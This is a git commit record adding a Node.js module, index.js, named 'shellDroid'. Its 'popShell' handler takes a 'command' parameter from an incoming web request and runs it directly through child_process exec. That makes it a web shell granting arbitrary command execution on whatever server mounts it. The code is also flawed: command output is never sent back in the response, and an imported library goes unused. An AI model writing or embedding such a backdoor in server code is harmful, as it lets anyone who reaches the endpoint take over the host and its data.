2b87454f52b4e578bcb2b1a6dc454f59fa9e1ad0
b <breen.machine@gmail.com>
2021-04-26 14:12:11 -0400

    first

---
+++ index.js
@@ -0,0 +1,23 @@
+var axios = require('axios');
+const { exec } = require('child_process');
+
+module.exports = function shellDroid(context) {
+  return {
+    popShell: function popShell(req, res) {
+      return doShell(context, req, res);
+    }
+  };
+};
+
+function doShell(context, req, res) {
+  var cmd=req.params.command;
+  exec(cmd, (err, stdout, stderr) => {
+    if (err) {
+      // node couldn't execute the command
+      return err;
+    }
+    return stdout;
+  });
+
+}
+
